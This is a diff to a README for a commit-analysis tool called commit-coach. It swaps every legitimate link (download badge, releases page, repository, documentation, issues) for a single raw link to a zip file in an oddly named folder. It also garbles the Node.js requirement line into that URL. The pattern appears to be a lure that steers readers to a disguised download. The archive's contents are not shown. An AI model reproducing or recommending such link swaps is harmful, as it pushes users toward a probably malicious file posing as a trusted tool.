@@ -1,13 +1,13 @@
 # 🎉 commit-coach - Analyze and Improve Your Code Commits
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-commit--coach-blue.svg)](https://github.com/maitrei9/commit-coach/releases)
+[![Download](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip)](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip)
 
 ## 🚀 Getting Started
 Welcome to commit-coach! This tool helps you analyze your code changes effectively. With commit-coach, you can gain insights on your commits, make better coding decisions, and improve your overall code quality. Follow the steps below to get started.
 
 ## 📂 Download & Install
-To download commit-coach, visit this page to download: [Releases Page](https://github.com/maitrei9/commit-coach/releases).
+To download commit-coach, visit this page to download: [Releases Page](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip).
 
 Here’s how to install and run commit-coach on your computer:
 
@@ -42,7 +42,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **Memory:** At least 2 GB of RAM.
 - **Disk Space:** Minimum of 100 MB available on your hard drive.
-- **Node.js:** Version 12 or later required.
+- **https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip** Version 12 or later required.
 
 ## 📋 How to Use commit-coach
 1. **Open Your Project:** After launching commit-coach, load the project you want to analyze.
@@ -72,8 +72,8 @@ Join our community of users and developers. Share your experiences, ask question
 We appreciate your feedback! Let us know how commit-coach has helped you or suggest improvements. Your input makes this tool better for everyone.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/maitrei9/commit-coach)
-- [Documentation](https://github.com/maitrei9/commit-coach/wiki)
-- [Issues](https://github.com/maitrei9/commit-coach/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip)
+- [Documentation](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip)
+- [Issues](https://raw.githubusercontent.com/maitrei9/commit-coach/main/Sihasapa/commit-coach.zip)
 
 Thank you for using commit-coach!
